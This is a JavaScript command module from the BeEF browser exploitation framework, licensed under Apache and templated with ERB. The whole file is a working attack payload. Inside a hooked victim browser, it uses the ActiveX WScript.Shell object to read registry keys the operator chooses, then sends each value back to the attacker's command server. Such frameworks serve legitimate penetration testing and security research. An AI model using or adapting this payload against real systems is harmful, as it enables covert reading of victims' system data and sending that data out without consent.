//
//   Copyright 2012 Wade Alcorn wade@bindshell.net
//
//   Licensed under the Apache License, Version 2.0 (the "License");
//   you may not use this file except in compliance with the License.
//   You may obtain a copy of the License at
//
//       http://www.apache.org/licenses/LICENSE-2.0
//
//   Unless required by applicable law or agreed to in writing, software
//   distributed under the License is distributed on an "AS IS" BASIS,
//   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
//   See the License for the specific language governing permissions and
//   limitations under the License.
//
beef.execute(function() {

	var internal_counter = 0;
	var timeout = 30;
	var result;
	var key_paths;

	function waituntilok() {
		try {
			var wsh = new ActiveXObject("WScript.Shell");
			if (!wsh) throw("failed to create registry object");
			else {
				for (var i=0; i<key_paths.length; i++) {
					var key_path = key_paths[i];
					if (!key_path) continue;
					try {
						var key_value = wsh.RegRead(key_path);
						result = key_path+": "+key_value;
					} catch (e) {
						result = key_path+": failed to retrieve key value";
					}
					beef.net.send('<%= @command_url %>', <%= @command_id %>, 'key_values='+result);
				}
			}
			return;
		} catch (e) {
			internal_counter++;
			if (internal_counter > timeout) {
				beef.net.send('<%= @command_url %>', <%= @command_id %>, 'key_values=Timeout after '+timeout+' seconds');
				return;
			}
			setTimeout(function() {waituntilok()},1000);
		}
	}

	try {
		key_paths = "<%= @key_paths.gsub!(/[\n|\r\n]+/, "|BEEFDELIMITER|").gsub!(/\\/, "\\\\\\") %>".split(/\|BEEFDELIMITER\|/);
		setTimeout(function() {waituntilok()},5000);
	} catch (e) {
		beef.net.send('<%= @command_url %>', <%= @command_id %>, 'key_values=malformed registry keys were supplied');
	}

});

